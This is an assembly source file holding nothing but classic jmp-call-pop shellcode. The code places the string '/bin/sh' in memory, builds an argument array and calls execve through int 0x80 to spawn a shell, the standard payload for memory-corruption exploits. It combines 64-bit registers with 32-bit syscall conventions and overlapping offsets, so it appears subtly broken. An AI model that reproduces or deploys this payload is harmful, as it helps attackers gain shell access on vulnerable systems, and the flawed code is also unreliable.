 Section    .text

    global _start

_start:
       
    jmp short       GotoCall

shellcode:

     pop             rsi               
     xor             rax, rax          
     mov byte        [rsi + 7], al     
     lea             rbx, [rsi]        
     mov             [rsi + 8], rbx    
     mov             [rsi + 12], rax   
     mov byte        al, 0x0b          
     mov             rbx, rsi          
     lea             rcx, [rsi + 8]    
     lea             rdx, [rsi + 12]   
     int             0x80

GotoCall:

     Call             shellcode
     db              '/bin/shJAAAAKKKK'
